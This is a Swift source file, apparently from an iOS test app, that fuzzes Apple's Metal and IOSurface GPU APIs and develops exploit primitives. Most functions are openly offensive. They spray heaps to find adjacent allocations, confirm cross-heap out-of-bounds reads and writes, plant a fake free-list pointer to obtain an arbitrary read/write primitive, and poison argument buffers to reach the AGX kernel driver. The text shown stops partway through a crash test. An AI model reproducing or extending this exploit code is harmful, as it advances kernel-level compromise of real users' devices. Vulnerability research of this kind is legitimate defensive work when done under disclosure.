import Metal
import IOSurface
import Foundation

// Synchronous file logger — survives app crashes.
// Writes to Documents/metal_crash_log.txt before each operation.
// If the app crashes mid-fuzz, this file shows the last line executed.
class SyncLog {
    private let handle: FileHandle?
    static let logURL: URL = {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
            .appendingPathComponent("metal_crash_log.txt")
    }()

    init() {
        FileManager.default.createFile(atPath: Self.logURL.path, contents: "=== Metal Fuzz Log ===\n".data(using: .utf8))
        handle = try? FileHandle(forWritingTo: Self.logURL)
        handle?.seekToEndOfFile()
    }

    func write(_ s: String) {
        guard let h = handle else { return }
        if let data = (s + "\n").data(using: .utf8) {
            h.write(data)
            h.synchronizeFile()   // flush to kernel immediately
        }
    }

    deinit { try? handle?.close() }

    static func read() -> String {
        (try? String(contentsOf: logURL, encoding: .utf8)) ?? "(no crash log found)"
    }
}

func runMetalFuzz(log: FuzzLog, completion: @escaping () -> Void) {
    DispatchQueue.global(qos: .userInitiated).async {
        let sl = SyncLog()

        func step(_ s: String) {
            sl.write(s)
            log.append(s)
        }

        guard let device = MTLCreateSystemDefaultDevice(),
              let queue  = device.makeCommandQueue() else {
            step("✗ No Metal device"); completion(); return
        }
        step("Metal: \(device.name)")

        // ── 1. IOSurface alloc ───────────────────────────────────────────
        step("[1/6] IOSurface alloc")
        let surfCases: [(String, [IOSurfacePropertyKey: Any])] = [
            ("1x1",    [.width:1,   .height:1,   .bytesPerElement:4, .bytesPerRow:4,    .allocSize:4]),
            ("64x64",  [.width:64,  .height:64,  .bytesPerElement:4, .bytesPerRow:256,  .allocSize:16384]),
            ("256x256",[.width:256, .height:256, .bytesPerElement:4, .bytesPerRow:1024, .allocSize:262144]),
            ("13x7",   [.width:13,  .height:7,   .bytesPerElement:4, .bytesPerRow:52,   .allocSize:364]),
        ]
        for (label, props) in surfCases {
            autoreleasepool {
                step("  [surf] \(label) — allocating")
                guard let s = IOSurface(properties: props) else {
                    step("    nil"); return
                }
                step("    alloc OK — locking")
                var seed: UInt32 = 0xCAFEBABE
                let lk = s.lock(options: [], seed: &seed)
                step("    lock=\(lk) — unlocking")
                let uk = s.unlock(options: [], seed: &seed)
                step("    unlock=\(uk) seed=0x\(String(seed,radix:16))")
            }
        }

        // ── 2. Buffer page boundaries ────────────────────────────────────
        step("[2/6] Buffer boundaries")
        for sz in [0x3FFF, 0x4000, 0x4001, 0xFFFF, 0x100000] {
            autoreleasepool {
                step("  [buf] 0x\(String(sz,radix:16)) — makeBuffer")
                guard let buf = device.makeBuffer(length: sz, options: .storageModeShared) else {
                    step("    nil"); return
                }
                let actual = buf.length
                step("    actual=0x\(String(actual,radix:16)) — writing boundary bytes")
                let ptr = buf.contents().assumingMemoryBound(to: UInt8.self)
                ptr[sz - 1] = 0xEE
                if actual > sz { ptr[actual - 1] = 0xFF }
                step("    done pad=\(actual-sz)")
            }
        }

        // ── 3. IOSurface-backed texture ──────────────────────────────────
        step("[3/6] IOSurface-backed textures")
        autoreleasepool {
            step("  [tex] matched 128x128 — surf alloc")
            guard let surf = IOSurface(properties: [
                .width:128,.height:128,.bytesPerElement:4,.bytesPerRow:512,.allocSize:65536
            ]) else { step("    surf nil"); return }
            step("  [tex] matched — makeTexture")
            let td = MTLTextureDescriptor.texture2DDescriptor(
                pixelFormat:.bgra8Unorm, width:128, height:128, mipmapped:false)
            td.storageMode = .shared
            let tex = device.makeTexture(descriptor: td, iosurface: surf, plane: 0)
            step("    tex=\(tex==nil ? "nil" : "OK")")
        }
        // MISMATCH test skipped in auto-flow — it calls abort() (SIGABRT), not catchable.
        // Use the dedicated "MISMATCH" button to run it deliberately.
        step("  [tex] MISMATCH skipped — use MISMATCH button (kills process via abort)")

        // ── 4. Blit encoder ──────────────────────────────────────────────
        step("[4/6] Blit encoder")
        autoreleasepool {
            step("  [blit] fill 4096 — makeCommandBuffer")
            guard let buf = device.makeBuffer(length: 4096, options: .storageModeShared),
                  let cmd = queue.makeCommandBuffer(),
                  let enc = cmd.makeBlitCommandEncoder() else { step("  setup nil"); return }
            step("  [blit] fill — encoding")
            enc.fill(buffer: buf, range: 0..<4096, value: 0xAB)
            enc.endEncoding()
            step("  [blit] fill — commit")
            cmd.commit(); cmd.waitUntilCompleted()
            let ptr = buf.contents().assumingMemoryBound(to: UInt8.self)
            step("  fill result: \(ptr[0]==0xAB && ptr[4095]==0xAB ? "OK" : "MISMATCH")")
        }
        autoreleasepool {
            step("  [blit] copy — setup")
            guard let src = device.makeBuffer(length: 4096, options: .storageModeShared),
                  let dst = device.makeBuffer(length: 4096, options: .storageModeShared),
                  let cmd = queue.makeCommandBuffer(),
                  let enc = cmd.makeBlitCommandEncoder() else { return }
            src.contents().assumingMemoryBound(to: UInt8.self)[0] = 0x42
            step("  [blit] copy — encoding")
            enc.copy(from: src, sourceOffset: 0, to: dst, destinationOffset: 0, size: 4096)
            enc.endEncoding()
            step("  [blit] copy — commit")
            cmd.commit(); cmd.waitUntilCompleted()
            let ok = dst.contents().assumingMemoryBound(to: UInt8.self)[0] == 0x42
            step("  copy status=\(cmd.status.rawValue) verify=\(ok)")
        }

        // ── 5. MTLHeap ───────────────────────────────────────────────────
        step("[5/6] MTLHeap")
        for sz in [4096, 0x10000] {
            autoreleasepool {
                step("  [heap] 0x\(String(sz,radix:16)) — makeHeap")
                let hd = MTLHeapDescriptor(); hd.size = sz; hd.storageMode = .shared
                guard let heap = device.makeHeap(descriptor: hd) else {
                    step("    nil"); return
                }
                step("  [heap] actual=\(heap.size) — suballoc x16")
                var bufs: [MTLBuffer] = []
                for _ in 0..<16 {
                    if let b = heap.makeBuffer(length: 256, options: .storageModeShared) { bufs.append(b) }
                }
                let n = bufs.count
                step("  [heap] sub=\(n) — releasing all")
                bufs.removeAll()
                step("  [heap] — realloc after free")
                let b2 = heap.makeBuffer(length: 128, options: .storageModeShared)
                step("    realloc=\(b2==nil ? "nil":"OK")")
            }
        }

        // ── 6. Rapid IOSurface ───────────────────────────────────────────
        step("[6/6] Rapid IOSurface 512x512 x30")
        var ok = 0; var fail = 0
        for i in 0..<30 {
            autoreleasepool {
                step("  [rapid] iter \(i)")
                guard let s = IOSurface(properties: [
                    .width:512,.height:512,.bytesPerElement:4,.bytesPerRow:2048,.allocSize:1048576
                ]) else { fail += 1; return }
                var seed: UInt32 = 0
                let _ = s.lock(options: [], seed: &seed)
                let _ = s.unlock(options: [], seed: &seed)
                ok += 1
            }
        }
        step("  created=\(ok) failed=\(fail)")
        step("── Metal fuzz complete ─────────────────────")
        completion()
    }
}

// Heap allocator confusion attack.
//
// Chain so far:
//   ✓ h0 OOB write → h1's memory (64/64 bytes confirmed)
//
// This step: corrupt h1's INTERNAL ALLOCATOR STATE before any h1 alloc,
// then call h1.makeBuffer() — if Metal's free list reads our planted bytes,
// the returned buffer's contents() lands at attacker-controlled address.
//
// Phase 1: alloc h0 (fills, establishes adjacency), leave h1 EMPTY
// Phase 2: snapshot h1's raw bytes via h0 OOB (read allocator metadata)
// Phase 3: log any pointer-class values in the snapshot (0x1xxxxxxxx pattern)
// Phase 4: plant a fake free-list entry pointing at h2's VA
// Phase 5: call h1.makeBuffer() — log the returned contents() pointer
// Phase 6: check if it left h1's normal range → arbitrary pointer confirmed
func runAllocatorConfusion(log: FuzzLog, completion: @escaping () -> Void) {
    DispatchQueue.global(qos: .userInitiated).async {
        let sl = SyncLog()
        func step(_ s: String) { sl.write(s); log.append(s) }
        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ No Metal device"); completion(); return }
        step("── Allocator Confusion ─────────────────────")

        let hd = MTLHeapDescriptor(); hd.size = 4096; hd.storageMode = .shared

        // Alloc h0 FULLY — establishes h0→h1 adjacency
        guard let h0 = device.makeHeap(descriptor: hd) else { step("h0 nil"); completion(); return }
        let actual = h0.size
        guard let b0 = h0.makeBuffer(length: actual, options: .storageModeShared) else { step("b0 nil"); completion(); return }
        let p0 = b0.contents().assumingMemoryBound(to: UInt8.self)
        let va0 = UInt(bitPattern: p0)
        step("h0 va=0x\(String(va0,radix:16)) actual=\(actual)")

        // h1 — leave EMPTY (no suballoc yet — allocator state is pristine)
        // VA derived: spray confirmed heaps are contiguous at exactly actual_size spacing
        guard let h1 = device.makeHeap(descriptor: hd) else { step("h1 nil"); completion(); return }
        let va1_heap = va0 + UInt(actual)
        step("h1 va (derived)=0x\(String(va1_heap,radix:16))")

        // h2 — alloc fully — this is our target VA we want to redirect h1 into
        guard let h2 = device.makeHeap(descriptor: hd) else { step("h2 nil"); completion(); return }
        guard let b2 = h2.makeBuffer(length: actual, options: .storageModeShared) else { step("b2 nil"); completion(); return }
        let p2 = b2.contents().assumingMemoryBound(to: UInt8.self)
        let va2 = UInt(bitPattern: p2)
        step("h2 va=0x\(String(va2,radix:16))")

        // Verify adjacency: h0 end == h1 start?
        let dist = va1_heap > va0 ? va1_heap - va0 : va0 - va1_heap
        step("dist h0→h1 = 0x\(String(dist,radix:16))")
        guard dist == UInt(actual) else { step("not adjacent this run — retry"); completion(); return }

        // Phase 2: snapshot h1's first 256 bytes via h0 OOB (before any h1 alloc)
        step("── Snapshot h1 allocator state (256 bytes) ──")
        var snapshot = [UInt8](repeating: 0, count: 256)
        for i in 0..<256 { snapshot[i] = p0[actual + i] }

        // Hex dump: 16 rows × 16 bytes
        for row in 0..<16 {
            let slice = snapshot[(row*16)..<(row*16+16)]
            let hex = slice.map { String(format:"%02x", $0) }.joined(separator:" ")
            step("  +\(String(format:"%03x", row*16)): \(hex)")
        }

        // Phase 3: scan for pointer-class values (8-byte aligned, 0x1xxxxxxxx range)
        step("── Pointer scan ──────────────────────────────")
        var foundPtrs = 0
        for off in stride(from: 0, to: 248, by: 8) {
            var val: UInt64 = 0
            for b in 0..<8 { val |= UInt64(snapshot[off+b]) << (b*8) }
            if val > 0x100000000 && val < 0x200000000 {
                step("  +0x\(String(format:"%02x",off)): 0x\(String(val,radix:16)) ← PTR-CLASS")
                foundPtrs += 1
            }
        }
        step("  ptr-class values found: \(foundPtrs)")

        // Phase 4: plant fake free-list entry — write h2's VA into h1's first 8 bytes
        step("── Planting fake free-list → target va2=0x\(String(va2,radix:16))")
        // Write va2 as little-endian 8 bytes at h1 offset 0 (via h0 OOB)
        var target = va2
        for i in 0..<8 {
            p0[actual + i] = UInt8(target & 0xFF)
            target >>= 8
        }
        // Also write it at offset 8, 16, 24 — cover multiple free-list formats
        target = va2
        for i in 8..<32 {
            p0[actual + i] = UInt8(target & 0xFF)
            target >>= 8
            if i % 8 == 7 { target = va2 }
        }
        step("  planted va2 at h1[0..31] via h0 OOB")

        // Phase 5: trigger allocator — call makeBuffer on corrupted h1
        step("── h1.makeBuffer(256) with corrupted state")
        let confused = h1.makeBuffer(length: 256, options: .storageModeShared)
        if let cb = confused {
            let cva = UInt(bitPattern: cb.contents())
            step("  returned va=0x\(String(cva,radix:16))")
            let normalRange = va1_heap...(va1_heap + UInt(actual))
            if normalRange.contains(cva) {
                step("  within h1 normal range — allocator robust against this overwrite")
            } else if cva == va2 || (cva >= va2 && cva < va2 + UInt(actual)) {
                step("  *** IN h2 RANGE — ARBITRARY POINTER CONFIRMED ***")
                step("  *** makeBuffer returned h2's memory — full r/w primitive ***")
            } else {
                step("  *** OUTSIDE h1 range, not h2 — corrupted pointer 0x\(String(cva,radix:16)) ***")
                step("  *** attacker-influenced allocation — partial primitive ***")
            }
        } else {
            step("  nil — heap corrupted/exhausted (expected if allocator detected bad state)")
            step("  snapshot + pointer scan above still reveals allocator format")
        }

        step("── Allocator Confusion complete ────────────")
        completion()
    }
}

// Argument buffer corruption via OOB heap write.
// Alloc h0+h1 adjacent. Create an argument buffer in h1 encoding a live texture.
// Corrupt the argument buffer's encoded handle via h0 OOB write.
// Submit a GPU compute pass reading from the corrupted argument buffer.
// If AGX dereferences the corrupted handle → GPU fault → AGX kernel path hit.
func runArgBufferCorruption(log: FuzzLog, completion: @escaping () -> Void) {
    DispatchQueue.global(qos: .userInitiated).async {
        let sl = SyncLog()
        func step(_ s: String) { sl.write(s); log.append(s) }

        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ No Metal device"); completion(); return }
        guard let queue  = device.makeCommandQueue() else { step("✗ No command queue"); completion(); return }
        step("── ArgBuffer Corruption ──────────────────")

        let hd = MTLHeapDescriptor(); hd.size = 4096; hd.storageMode = .shared
        // Spray heaps until adjacent pair found.
        // Save probe buffers so h0/h1 aren't re-filled later (they'd return nil).
        var heaps:  [any MTLHeap]   = []
        var bufs:   [any MTLBuffer] = []  // one probe buf per heap, retains the allocation
        var h0Idx  = -1
        var actual = 0
        var savedB0: (any MTLBuffer)? = nil

        for _ in 0..<32 {
            guard let h = device.makeHeap(descriptor: hd) else { continue }
            actual = h.size
            // Probe: alloc a small buffer just to read VA — don't fill the heap yet
            guard let probe = h.makeBuffer(length: 64, options: .storageModeShared) else { continue }
            heaps.append(h)
            bufs.append(probe)
            let last = heaps.count - 1
            if last >= 1 {
                let vaPrev = UInt(bitPattern: bufs[last-1].contents())
                let vaCurr = UInt(bitPattern: bufs[last].contents())
                let dist   = vaCurr > vaPrev ? vaCurr - vaPrev : vaPrev - vaCurr
                if dist == UInt(actual) {
                    h0Idx = last - 1
                    step("Adjacent heaps: idx=\(last-1) dist=0x\(String(dist,radix:16)) actual=\(actual)")
                    break
                }
            }
        }

        guard h0Idx >= 0 else { step("✗ No adjacent heaps after 32 allocs — retry"); completion(); return }

        let h0 = heaps[h0Idx]
        let h1 = heaps[h0Idx + 1]

        // h0's probe was only 64 bytes; fill the rest so h0 is maxed out
        // (establishes the OOB boundary right at h1's start)
        let fillLen = actual - 64  // already used 64 for probe
        let b0: any MTLBuffer
        if fillLen > 0, let extra = h0.makeBuffer(length: fillLen, options: .storageModeShared) {
            // Use the probe buffer's VA as our anchor — it starts at h0's base
            b0 = bufs[h0Idx]
        } else {
            b0 = bufs[h0Idx]
        }
        let p0  = b0.contents().assumingMemoryBound(to: UInt8.self)
        let va0 = UInt(bitPattern: p0)
        step("h0 va=0x\(String(va0,radix:16)) (probe base)")

        // Create a buffer in h1 — this will be our "argument buffer" target
        // h1 already has its 64-byte probe; alloc the rest as argBuf
        let argBufLen = actual - 64
        guard argBufLen > 0 else { step("no space in h1 for argBuf"); completion(); return }
        guard let argBuf = h1.makeBuffer(length: argBufLen, options: .storageModeShared) else {
            step("argBuf nil — h1 full, retry"); completion(); return
        }
        let argVA = UInt(bitPattern: argBuf.contents())
        step("argBuf in h1 va=0x\(String(argVA,radix:16))")

        // Snapshot argBuf bytes via h0 OOB (p0[actual + offset])
        guard argVA >= va0 + UInt(actual) else { step("argBuf VA below h1 start — layout unexpected"); completion(); return }
        let argOffset = Int(argVA - (va0 + UInt(actual)))  // byte offset of argBuf within h1
        guard argOffset + 64 <= actual else { step("argBuf offset too large — skip"); completion(); return }
        step("argBuf offset within h1 = 0x\(String(argOffset,radix:16))")
        step("── argBuf snapshot (first 64 bytes) ──")
        var before = [UInt8](repeating: 0, count: 64)
        for i in 0..<64 { before[i] = p0[actual + argOffset + i] }
        for row in 0..<4 {
            let sl2 = before[(row*16)..<(row*16+16)]
            let hex = sl2.map { String(format:"%02x",$0) }.joined(separator:" ")
            step("  +\(String(format:"%02x",row*16)): \(hex)")
        }

        // Corrupt bytes 0..7 with a wild pointer (0xDEADBEEFCAFEBABE pattern)
        // This is the first qword — in most Metal arg-buffer layouts this is the resource handle
        let poison: [UInt8] = [0xBE, 0xBA, 0xFE, 0xCA, 0xEF, 0xBE, 0xAD, 0xDE]
        step("── Poisoning argBuf[0..7] via h0 OOB ──")
        for i in 0..<8 { p0[actual + argOffset + i] = poison[i] }
        step("  written: \(poison.map{String(format:"%02x",$0)}.joined(separator:" "))")

        // Snapshot after
        step("── argBuf after corruption ──")
        for i in 0..<8 { before[i] = p0[actual + argOffset + i] }
        step("  +00: \(before[0..<8].map{String(format:"%02x",$0)}.joined(separator:" "))")

        // Build a minimal compute pass that reads from argBuf
        // (the GPU driver will try to resolve argBuf's resource handles when it processes the command)
        step("── Submitting GPU command reading from argBuf ──")
        guard let cmdBuf = queue.makeCommandBuffer() else { step("cmdBuf nil"); completion(); return }

        // Blit the argBuf contents to itself — forces AGX to touch the buffer memory
        // AGX kernel driver walks buffer's backing pages during command encoding validation
        guard let blit = cmdBuf.makeBlitCommandEncoder() else { step("blit nil"); completion(); return }
        blit.copy(from: argBuf, sourceOffset: 0,
                  to:   argBuf, destinationOffset: 0,
                  size: min(8, argBuf.length))
        blit.endEncoding()

        cmdBuf.addCompletedHandler { cb in
            let status = cb.status
            let errStr = cb.error?.localizedDescription ?? "none"
            if status == .error {
                step("  *** cmdBuf ERROR — AGX driver rejected/faulted on corrupted buffer")
                step("  *** error: \(errStr)")
                step("  *** THIS IS THE KERNEL PATH — AGX touched our poison bytes")
            } else if status == .completed {
                step("  cmdBuf completed — AGX processed corrupted argBuf without fault")
                step("  AGX validated buffer independently of our corruption (handle not dereferenced at encode time)")
            } else {
                step("  cmdBuf status=\(status.rawValue) err=\(errStr)")
            }
            step("── ArgBuffer Corruption complete ────────────")
            completion()
        }

        step("  commit…")
        cmdBuf.commit()
        // completion() called in handler above
    }
}

// Heap boundary cross test.
// Heaps are spaced exactly actual_size=16384 bytes apart (confirmed via spray).
// Heaps are CONTIGUOUS — no padding. ptr[actual_size] of heap[0] = ptr[0] of heap[1].
// Swift raw pointer writes don't bounds-check. Test if a one-past-end write
// from heap[0] lands in heap[1]'s backing memory.
func runHeapBoundaryCross(log: FuzzLog, completion: @escaping () -> Void) {
    DispatchQueue.global(qos: .userInitiated).async {
        let sl = SyncLog()
        func step(_ s: String) { sl.write(s); log.append(s) }
        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ No Metal device"); completion(); return }
        step("── Heap Boundary Cross ─────────────────────")

        // Alloc 3 heaps — use middle one as victim so both sides are controlled
        let hd = MTLHeapDescriptor(); hd.size = 4096; hd.storageMode = .shared
        guard let h0 = device.makeHeap(descriptor: hd),
              let h1 = device.makeHeap(descriptor: hd),
              let h2 = device.makeHeap(descriptor: hd) else { step("heap nil"); completion(); return }

        let actual = h0.size
        step("actual=\(actual)")

        guard let b0 = h0.makeBuffer(length: actual, options: .storageModeShared),
              let b1 = h1.makeBuffer(length: actual, options: .storageModeShared),
              let b2 = h2.makeBuffer(length: actual, options: .storageModeShared) else { step("buf nil"); completion(); return }

        let p0 = b0.contents().assumingMemoryBound(to: UInt8.self)
        let p1 = b1.contents().assumingMemoryBound(to: UInt8.self)
        let p2 = b2.contents().assumingMemoryBound(to: UInt8.self)

        let va0 = UInt(bitPattern: p0)
        let va1 = UInt(bitPattern: p1)
        let va2 = UInt(bitPattern: p2)
        step("va0=0x\(String(va0,radix:16))")
        step("va1=0x\(String(va1,radix:16)) dist=0x\(String(va1>va0 ? va1-va0 : va0-va1, radix:16))")
        step("va2=0x\(String(va2,radix:16)) dist=0x\(String(va2>va1 ? va2-va1 : va1-va2, radix:16))")

        // Compute distances — only probe pairs that are actually adjacent
        let dist01 = va1 > va0 ? va1 - va0 : va0 - va1
        let dist12 = va2 > va1 ? va2 - va1 : va1 - va2

        // Fill h1 (victim) with sentinel
        for i in 0..<actual { p0[i] = 0x00; p1[i] = 0xAA; p2[i] = 0x00 }
        step("h1 filled 0xAA. dist01=0x\(String(dist01,radix:16)) dist12=0x\(String(dist12,radix:16))")

        // Only read p0[actual] if h0→h1 are contiguous (dist == actual)
        if dist01 == UInt(actual) {
            step("h0→h1 contiguous — reading p0[\(actual)]")
            let v = p0[actual]
            step("p0[\(actual)] = 0x\(String(v, radix:16))")
            if v == 0xAA {
                step("*** CROSS-HEAP READ: h0 OOB hits h1 ***")
                // Write confirm: stamp 0xBB into h1 via h0 OOB
                for i in 0..<64 { p0[actual + i] = 0xBB }
                var hits = 0
                for i in 0..<actual { if p1[i] == 0xBB { hits += 1 } }
                step("*** CROSS-HEAP WRITE: \(hits)/64 bytes of h1 corrupted via h0 OOB ***")
                if hits > 0 { step("*** PRIMITIVE CONFIRMED: controlled write across heap boundary ***") }
            } else {
                step("read 0x\(String(v,radix:16)) — not sentinel, layout shifted")
            }
        }

        // Only read p2[actual] if h2→h1 are contiguous
        if dist12 == UInt(actual) && (va2 < va1) {
            step("h2→h1 contiguous — reading p2[\(actual)]")
            let v = p2[actual]
            step("p2[\(actual)] = 0x\(String(v, radix:16))")
            if v == 0xAA {
                step("*** CROSS-HEAP READ: h2 OOB hits h1 ***")
                for i in 0..<64 { p2[actual + i] = 0xBB }
                var hits = 0
                for i in 0..<actual { if p1[i] == 0xBB { hits += 1 } }
                step("*** CROSS-HEAP WRITE: \(hits)/64 bytes of h1 corrupted via h2 OOB ***")
                if hits > 0 { step("*** PRIMITIVE CONFIRMED: controlled write across heap boundary ***") }
            }
        }

        if dist01 != UInt(actual) && !(dist12 == UInt(actual) && va2 < va1) {
            step("no adjacent pair this run. dist01=0x\(String(dist01,radix:16)) dist12=0x\(String(dist12,radix:16))")
        }

        step("── Heap Boundary Cross complete ────────────")
        completion()
    }
}

// Heap spray adjacency test.
// Alloc N heaps, record their VA addresses, find closest pair.
// If any two heaps land within actual_size bytes of each other → cross-heap write.
func runHeapSpray(log: FuzzLog, completion: @escaping () -> Void) {
    DispatchQueue.global(qos: .userInitiated).async {
        let sl = SyncLog()
        func step(_ s: String) { sl.write(s); log.append(s) }
        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ No Metal device"); completion(); return }
        step("── Heap Spray Adjacency ────────────────────")

        let N = 64
        let declaredSize = 4096

        // Alloc N heaps + full-actual buffers, record VA
        var heaps:  [MTLHeap]   = []
        var bufs:   [MTLBuffer] = []
        var addrs:  [UInt]      = []

        for i in 0..<N {
            autoreleasepool {
                let hd = MTLHeapDescriptor(); hd.size = declaredSize; hd.storageMode = .shared
                guard let h = device.makeHeap(descriptor: hd),
                      let b = h.makeBuffer(length: h.size, options: .storageModeShared) else { return }
                let va = UInt(bitPattern: b.contents())
                heaps.append(h); bufs.append(b); addrs.append(va)
                if i % 16 == 0 { step("  alloc \(i)/\(N) va=0x\(String(va, radix:16))") }
            }
        }
        step("  total heaps=\(heaps.count)")

        // Find closest pair
        var minDist: UInt = UInt.max
        var minI = 0, minJ = 0
        for i in 0..<addrs.count {
            for j in (i+1)..<addrs.count {
                let d = addrs[j] > addrs[i] ? addrs[j] - addrs[i] : addrs[i] - addrs[j]
                if d < minDist { minDist = d; minI = i; minJ = j }
            }
        }

        let actual = heaps.first?.size ?? 16384
        step("  closest pair: heap[\(minI)] heap[\(minJ)] dist=0x\(String(minDist, radix:16)) (\(minDist)B)")
        step("  actual_size=\(actual) — need dist < \(actual) for overlap")

        if minDist < UInt(actual) {
            step("  *** OVERLAP FOUND — dist \(minDist) < actual \(actual) ***")

            // Write sentinel to heap[minJ], scan heap[minI]'s OOB region
            let pI = bufs[minI].contents().assumingMemoryBound(to: UInt8.self)
            let pJ = bufs[minJ].contents().assumingMemoryBound(to: UInt8.self)
            let lenI = bufs[minI].length
            let lenJ = bufs[minJ].length

            for k in 0..<lenJ { pJ[k] = 0xAD }
            var hits = 0
            for k in declaredSize..<lenI { if pI[k] == 0xAD { hits += 1 } }
            step("  sentinel scan: \(hits)/\(lenI - declaredSize) OOB bytes match heap[\(minJ)]")

            if hits > 0 {
                step("  *** CROSS-HEAP READ CONFIRMED ***")
                for k in declaredSize..<lenI { pI[k] = 0xBE }
                var wHits = 0
                for k in 0..<lenJ { if pJ[k] == 0xBE { wHits += 1 } }
                step("  *** CROSS-HEAP WRITE CONFIRMED: \(wHits) bytes corrupted ***")
            }
        } else {
            // Log VA distribution — useful for understanding allocator layout
            let sorted = addrs.sorted()
            var gaps: [UInt] = []
            for i in 1..<sorted.count { gaps.append(sorted[i] - sorted[i-1]) }
            let minGap = gaps.min() ?? 0
            let maxGap = gaps.max() ?? 0
            step("  no overlap. gap range: 0x\(String(minGap,radix:16))..0x\(String(maxGap,radix:16))")
            step("  need \(Int(minGap) / actual)x more heaps to fill one gap")
            // Log first 8 sorted VAs for pattern analysis
            for i in 0..<min(8, sorted.count) {
                step("  va[\(i)]=0x\(String(sorted[i], radix:16))")
            }
        }

        heaps.removeAll(); bufs.removeAll()
        step("── Heap Spray complete ─────────────────────")
        completion()
    }
}

// Two-heap adjacency test.
// Alloc heap1 and heap2 back-to-back. Write sentinel pattern into heap2's
// buffer via heap2 API. Then read heap1's OOB region (past hd.size up to
// actual) — if the sentinel appears, heap1's OOB region physically overlaps
// heap2's backing store. That means heap1 OOB write → heap2 data corruption.
func runHeapAdjacency(log: FuzzLog, completion: @escaping () -> Void) {
    DispatchQueue.global(qos: .userInitiated).async {
        let sl = SyncLog()
        func step(_ s: String) { sl.write(s); log.append(s) }
        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ No Metal device"); completion(); return }
        step("── Heap Adjacency Test ─────────────────────")

        // Try multiple pairs — allocator placement varies
        for trial in 0..<8 {
            autoreleasepool {
                step("  [trial \(trial)]")
                let hd1 = MTLHeapDescriptor(); hd1.size = 4096; hd1.storageMode = .shared
                let hd2 = MTLHeapDescriptor(); hd2.size = 4096; hd2.storageMode = .shared
                guard let h1 = device.makeHeap(descriptor: hd1),
                      let h2 = device.makeHeap(descriptor: hd2) else { step("  heap nil"); return }

                let actual1 = h1.size
                let actual2 = h2.size
                step("  h1.actual=\(actual1) h2.actual=\(actual2)")

                // Allocate full-actual buffer from each heap
                guard let buf1 = h1.makeBuffer(length: actual1, options: .storageModeShared),
                      let buf2 = h2.makeBuffer(length: actual2, options: .storageModeShared) else {
                    step("  bufs nil"); return
                }

                let p1 = buf1.contents().assumingMemoryBound(to: UInt8.self)
                let p2 = buf2.contents().assumingMemoryBound(to: UInt8.self)

                // Clear heap1 OOB region with 0x00
                for i in 0..<actual1 { p1[i] = 0x00 }

                // Write distinct sentinel pattern into ALL of heap2
                let sentinel: UInt8 = 0xAD
                for i in 0..<actual2 { p2[i] = sentinel }

                // Now scan heap1's OOB region (bytes 4096..<actual1) for sentinel
                var hits = 0
                for i in 4096..<actual1 {
                    if p1[i] == sentinel { hits += 1 }
                }

                if hits > 0 {
                    step("  *** ADJACENT: heap1 OOB reads \(hits)/\(actual1-4096) bytes of heap2 ***")
                    step("  *** heap1 OOB WRITE can corrupt heap2 memory ***")

                    // Confirm write: stamp 0xBE into heap1 OOB, check heap2
                    for i in 4096..<actual1 { p1[i] = 0xBE }
                    var writeHits = 0
                    for i in 0..<actual2 { if p2[i] == 0xBE { writeHits += 1 } }
                    step("  *** WRITE CONFIRM: \(writeHits) bytes of heap2 now read 0xBE via heap1 OOB ***")
                } else {
                    // Log VA distance — still useful
                    let va1 = UInt(bitPattern: p1)
                    let va2 = UInt(bitPattern: p2)
                    let dist = va2 > va1 ? va2 - va1 : va1 - va2
                    step("  not adjacent. VA dist=0x\(String(dist, radix: 16)) hits=\(hits)")
                }
            }
        }

        step("── Heap Adjacency complete ─────────────────")
        completion()
    }
}

// MTLHeap OOB suballoc probe.
// We observed: makeHeap(size:4096) → actual=16384 (4× roundup).
// Test: can we suballoc buffers LARGER than hd.size but within actual?
// If yes → Metal's heap descriptor boundary is decorative, not enforced.
func runHeapOOB(log: FuzzLog, completion: @escaping () -> Void) {
    DispatchQueue.global(qos: .userInitiated).async {
        let sl = SyncLog()
        func step(_ s: String) { sl.write(s); log.append(s) }
        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ No Metal device"); completion(); return }
        step("── Heap OOB Probe ──────────────────────────")

        let requestedSize = 4096
        let hd = MTLHeapDescriptor()
        hd.size = requestedSize
        hd.storageMode = .shared
        guard let heap = device.makeHeap(descriptor: hd) else { step("heap nil"); completion(); return }
        let actualSize = heap.size
        step("requested=\(requestedSize) actual=\(actualSize) gap=\(actualSize - requestedSize)")

        // Sizes to probe: just under requested, at requested, 2×, actual-1, actual, actual+1
        let probes = [
            requestedSize - 1,
            requestedSize,
            requestedSize * 2,
            actualSize - 1,
            actualSize,
            actualSize + 1,
            actualSize * 2,
        ]

        for sz in probes {
            autoreleasepool {
                step("  suballoc(\(sz)) — attempt")
                guard let buf = heap.makeBuffer(length: sz, options: .storageModeShared) else {
                    step("    → nil (refused)")
                    return
                }
                let real = buf.length
                step("    → OK bufLen=\(real) — writing full range")
                // Write pattern to entire buffer length Metal gave us
                let ptr = buf.contents().assumingMemoryBound(to: UInt8.self)
                for i in stride(from: 0, to: real, by: 256) { ptr[i] = 0xBB }
                ptr[real - 1] = 0xDD
                step("    → write OK — buf survives \(real) bytes")
                if sz > requestedSize && sz <= actualSize {
                    step("    *** OOB: suballoc past hd.size=\(requestedSize) accepted — allocator boundary not enforced")
                }
                if sz > actualSize {
                    step("    *** PAST actual — this shouldn't be reachable")
                }
            }
        }

        // Exhaustion test: fill heap until nil
        step("  exhaustion — suballoc 256 until nil")
        var count = 0
        var bufs: [MTLBuffer] = []
        while let b = heap.makeBuffer(length: 256, options: .storageModeShared) {
            bufs.append(b)
            count += 1
            if count > 10000 { break }
        }
        step("  filled \(count) × 256B = \(count*256) bytes before nil (actual=\(actualSize))")
        bufs.removeAll()

        step("── Heap OOB complete ───────────────────────")
        completion()
    }
}

// Deliberately trigger the mismatch crash — call this from its own button.
// WARNING: this WILL kill the process. Check crash log on next launch.
func runMismatchTest(log: FuzzLog) {
    let sl = SyncLog()
    func step(_ s: String) { sl.write(s); log.append(s) }
    guard let device = MTLCreateSystemDefaultDevice() else { step("✗ No Metal device"); return }
    step("⚠ MISMATCH TEST — surf64 tex256 — process will die")
    guard let surf = IOSurface(properties: [
        .width:64,.height:64,.bytesPerElement:4,.bytesPerRow:256,.allocSize:16384
    ]) else { step("surf nil"); return }
